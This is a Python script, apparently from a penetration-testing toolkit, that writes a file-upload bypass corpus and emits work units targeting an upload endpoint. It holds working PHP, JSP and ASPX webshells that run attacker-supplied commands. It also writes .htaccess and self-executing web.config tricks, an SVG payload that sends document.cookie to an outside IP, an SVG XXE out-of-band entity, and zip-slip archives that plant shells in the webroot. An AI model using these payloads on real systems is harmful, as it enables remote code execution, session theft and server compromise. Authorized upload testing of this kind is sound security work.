#!/usr/bin/env python3
"""gen_upload_payloads.py — generate a file-upload bypass corpus + rupu work units.

Writes webshell/polyglot/.htaccess/web.config/SVG/zip-slip payload files to an
output directory and emits a rupu-ingestible work-units JSON ARRAY (one unit
per upload variant: filename to send, part Content-Type, payload file,
verification step).

Usage:
  python3 scripts/gen_upload_payloads.py --out payloads/ \
      --target https://192.0.2.10/profile/avatar --field file \
      --work-units upload_units.json [--param c] [--webroot /var/www/html]

The resulting array is consumed by the `work-units` skill / rupu `for_each:`.
"""
import argparse
import json
import os
import sys
import zipfile

PHP_SHELL = "<?php system($_GET['{p}']); ?>\n"

JSP_SHELL = (
    '<%@ page import="java.io.*" %><%\n'
    'String c = request.getParameter("{p}");\n'
    'if (c != null) {{\n'
    '  Process pr = Runtime.getRuntime().exec(c);\n'
    '  BufferedReader r = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n'
    '  String l; while ((l = r.readLine()) != null) {{ out.println(l); }}\n'
    '}} %>\n'
)

ASPX_SHELL = (
    '<%@ Page Language="C#" %><%\n'
    'var c = Request["{p}"];\n'
    'if (c != null) {{\n'
    '  var psi = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + c);\n'
    '  psi.RedirectStandardOutput = true; psi.UseShellExecute = false;\n'
    '  var pr = System.Diagnostics.Process.Start(psi);\n'
    '  Response.Write(pr.StandardOutput.ReadToEnd());\n'
    '}} %>\n'
)

HTACCESS = (
    "AddType application/x-httpd-php .s9l\n"
    '<FilesMatch "\\.s9l$">\nSetHandler application/x-httpd-php\n</FilesMatch>\n'
)

WEB_CONFIG = """<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="wcfg" path="web.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security><requestFiltering>
      <fileExtensions><remove fileExtension=".config" /></fileExtensions>
      <hiddenSegments><remove segment="web.config" /></hiddenSegments>
    </requestFiltering></security>
  </system.webServer>
</configuration>
<!-- ASP payload executes when web.config itself is requested -->
<%
Response.Write(CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll())
%>
"""

SVG_XSS = (
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">\n'
    "  <script>fetch('https://198.51.100.9/c?d='+encodeURIComponent(document.cookie))</script>\n"
    "</svg>\n"
)

SVG_XXE = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://OOB-DOMAIN/xxe"> ]>\n'
    '<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>\n'
)


def write(path, data):
    mode = "wb" if isinstance(data, bytes) else "w"
    with open(path, mode) as f:
        f.write(data)
    return path


def build_corpus(out, param, webroot):
    """Write payload files; return list of (relpath, send_filename, part_ct, bypass, verify)."""
    php = PHP_SHELL.format(p=param)
    jsp = JSP_SHELL.format(p=param)
    aspx = ASPX_SHELL.format(p=param)
    verify_exec = "GET stored URL + '?%s=id' (unix) / '?%s=whoami' (win); command output in body = exec" % (param, param)
    verify_source = "if raw source returned: stored-not-executed -> .htaccess / LFI include pivot"
    verify = verify_exec + "; " + verify_source
    items = []

    def add(fname_on_disk, send_as, content, ct, bypass, vfy=verify):
        p = write(os.path.join(out, fname_on_disk), content)
        items.append({
            "file": p, "filename": send_as, "part_content_type": ct,
            "bypass": bypass, "verify": vfy,
        })

    # --- PHP extension variants ---
    add("shell.php", "shell.php", php, "application/x-php", "none (control)")
    add("shell.pHp", "shell.pHp", php, "image/jpeg", "case variation")
    for ext in ("php5", "phtml", "phar", "pht", "php3"):
        add("shell." + ext, "shell." + ext, php, "image/jpeg", "alternate extension ." + ext)
    add("shell.php.jpg", "shell.php.jpg", php, "image/jpeg", "double extension (Apache AddHandler)")
    add("shell.jpg.php", "shell.jpg.php", php, "image/jpeg", "last-extension executable")
    add("shell_trailingdot.php", "shell.php.", php, "image/jpeg", "trailing dot (Windows strip)")
    add("shell_trailingspace.php", "shell.php ", php, "image/jpeg", "trailing space (Windows strip)")
    add("shell_nullbyte.php", "shell.php\x00.jpg", php, "image/jpeg",
        "null byte in filename (send raw 0x00 via proxy hex edit; file saved locally without NUL)")
    # --- JSP / ASPX ---
    add("shell.jsp", "shell.jsp", jsp, "image/jpeg", "jsp webshell")
    add("shell.jspx", "shell.jspx", jsp, "image/jpeg", "alternate extension .jspx")
    add("shell.aspx", "shell.aspx", aspx, "image/jpeg", "aspx webshell")
    add("shell.ashx", "shell.ashx", aspx, "image/jpeg", "alternate extension .ashx")
    # --- magic-byte polyglot ---
    add("poly.php.gif", "poly.php.gif", "GIF89a;\n" + php, "image/gif",
        "GIF89a magic prefix + double extension (beats libmagic sniff)")
    add("poly.gif.php", "poly.gif.php", "GIF89a;\n" + php, "image/gif",
        "GIF89a magic prefix, .php final extension")
    # --- .htaccess + companion shell ---
    add("htaccess_payload", ".htaccess", HTACCESS, "text/plain",
        ".htaccess remap: makes .s9l execute as PHP in the upload dir",
        "upload .htaccess first, then shell.s9l; GET /uploads/shell.s9l?%s=id" % param)
    add("shell.s9l", "shell.s9l", php, "image/jpeg",
        "companion shell for .htaccess remap (upload AFTER .htaccess)")
    # --- web.config (IIS) ---
    add("web.config", "web.config", WEB_CONFIG, "application/xml",
        "web.config self-executing ASP (IIS)", "GET /uploads/web.config; whoami output = exec")
    # --- SVG ---
    add("xss.svg", "xss.svg", SVG_XSS, "image/svg+xml",
        "SVG stored XSS", "view stored SVG inline; alert/callback fires = stored XSS")
    add("xxe.svg", "xxe.svg", SVG_XXE, "image/svg+xml",
        "SVG XXE/SSRF (replace OOB-DOMAIN with interactsh id)",
        "interactsh DNS/HTTP hit during server-side render = XXE/SSRF")
    # --- zip-slip archives ---
    for name, entry, shell, ct in (
        ("zipslip_unix.zip", "../" * 8 + webroot.lstrip("/") + "/s9l_slip.php", php, "application/zip"),
        ("zipslip_win.zip", "..\\" * 8 + "inetpub\\wwwroot\\s9l_slip.aspx", aspx, "application/zip"),
    ):
        zpath = os.path.join(out, name)
        with zipfile.ZipFile(zpath, "w") as z:
            z.writestr(zipfile.ZipInfo(entry), shell)
            z.writestr("decoy.txt", "readme\n")
        items.append({
            "file": zpath, "filename": name, "part_content_type": ct,
            "bypass": "zip-slip entry name: " + entry,
            "verify": "after extraction, GET the escaped path; planted file present = arbitrary write",
        })
    return items


def to_work_units(items, target, field):
    units = []
    seen = set()
    for it in items:
        base = "upload-" + "".join(
            ch if ch.isalnum() else "-" for ch in it["bypass"].lower()
        ).strip("-")[:48]
        uid, n = base, 1
        while uid in seen:
            n += 1
            uid = "%s-%d" % (base, n)
        seen.add(uid)
        units.append({
            "id": uid,
            "title": "Upload %r (%s) to %s" % (it["filename"], it["bypass"], target),
            "targets": [target],
            "hints": {
                "field": field,
                "filename": it["filename"],
                "part_content_type": it["part_content_type"],
                "payload_file": it["file"],
                "bypass": it["bypass"],
                "verify": it["verify"],
                "wstg": "WSTG-BUSL-09",
                "cwe": "CWE-434",
            },
        })
    return units


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--out", default="payloads", help="output dir for payload files")
    ap.add_argument("--target", default="https://192.0.2.10/upload", help="upload endpoint URL")
    ap.add_argument("--field", default="file", help="multipart field name")
    ap.add_argument("--param", default="c", help="webshell command parameter name")
    ap.add_argument("--webroot", default="/var/www/html", help="guessed webroot for zip-slip entries")
    ap.add_argument("--work-units", help="write rupu work-units JSON array here")
    args = ap.parse_args()

    os.makedirs(args.out, exist_ok=True)
    items = build_corpus(args.out, args.param, args.webroot)
    print("[+] wrote %d payload files under %s" % (len(items), args.out))
    for it in items:
        print("    %-28s send as %-24r CT=%s" % (
            os.path.basename(it["file"]), it["filename"], it["part_content_type"]))

    if args.work_units:
        units = to_work_units(items, args.target, args.field)
        with open(args.work_units, "w") as f:
            json.dump(units, f, indent=2)
        print("[+] wrote %d work units -> %s (feed to the work-units skill / for_each:)"
              % (len(units), args.work_units))
    return 0


if __name__ == "__main__":
    sys.exit(main())
